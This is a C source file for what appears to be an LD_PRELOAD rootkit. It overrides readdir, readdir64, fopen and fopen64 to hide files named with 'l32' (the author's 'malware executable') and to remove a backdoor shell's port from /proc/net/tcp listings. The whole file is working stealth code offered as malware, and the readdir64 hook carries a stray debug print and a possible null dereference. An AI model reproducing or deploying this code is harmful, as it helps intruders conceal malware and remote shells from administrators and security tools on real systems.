#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/types.h>
#include <errno.h>

#define SHELL_PORT "FE63"

// Signature from "man readdir(3)" (does not mention the 64 version)
struct dirent64 *readdir64(DIR *dirp) {
    // Obtain and store the address of the original readdir64
    struct dirent64 *(*readdir64_old)(DIR *dirp);
    readdir64_old = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *result;

    // Call original function to obtain information about the current file of the DIR stream
    result = readdir64_old(dirp);
    // If we reached the end of the DIR stream result is NULL
    if (result != NULL) {
        // Check if the current file is our malware executable
        if (strstr(result->d_name, "l32") != NULL) {
            // If so, replace result with the next file so it's not shown
            result = readdir64_old(dirp);
            puts(result->d_name);
        }
    }

    return result;
}

// Signature from "man readdir(3)"
struct dirent *readdir(DIR *dirp) {
    // Obtain and store the address of the original readdir
    struct dirent *(*readdir_old)(DIR *dirp);
    readdir_old = dlsym(RTLD_NEXT, "readdir");

    struct dirent *result;

    // Call original function to obtain information about the current file of the DIR stream
    result = readdir_old(dirp);
    // If we reached the end of the DIR stream result is NULL
    if (result != NULL) {
        // Check if the current file is our malware executable
        if (strstr(result->d_name, "l32") != NULL) {
            // If so, replace result with the next file so it's not shown
            result = readdir_old(dirp);
        }
    }

    return result;
}

// Signature from "man fopen(3)"
FILE *fopen64(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen64
    FILE *(*fopen64_old)(const char *pathname, const char *mode);
    fopen64_old = dlsym(RTLD_NEXT, "fopen64");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile64();
        // Open the original file
        FILE *content = fopen64_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen64 for any other file
        FILE *result = fopen64_old(pathname, mode);
        return result;
    }
}

// Signature from "man fopen(3)"
FILE *fopen(const char *pathname, const char *mode) {
    // Obtain and store the address of the original fopen
    FILE *(*fopen_old)(const char *pathname, const char *mode);
    fopen_old = dlsym(RTLD_NEXT, "fopen");

    // Check if we open the file containing our open TCP socket
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        // Create file to store the edited output
        FILE *result = tmpfile();
        // Open the original file
        FILE *content = fopen_old(pathname, mode);

        char line[256];
        // Iterate over the lines of the original file
        while (fgets(line, sizeof(line), content) != NULL) {
            // Only add the line to the result if it does not contain our port
            if (strstr(line, SHELL_PORT) == NULL) {
                fputs(line, result);
            }
        }

        // set the file position indicator to the beginning, otherwise programs can't read from it
        rewind(result);
        return result;
    } else {
        // Use the original fopen for any other file
        FILE *result = fopen_old(pathname, mode);
        return result;
    }
}
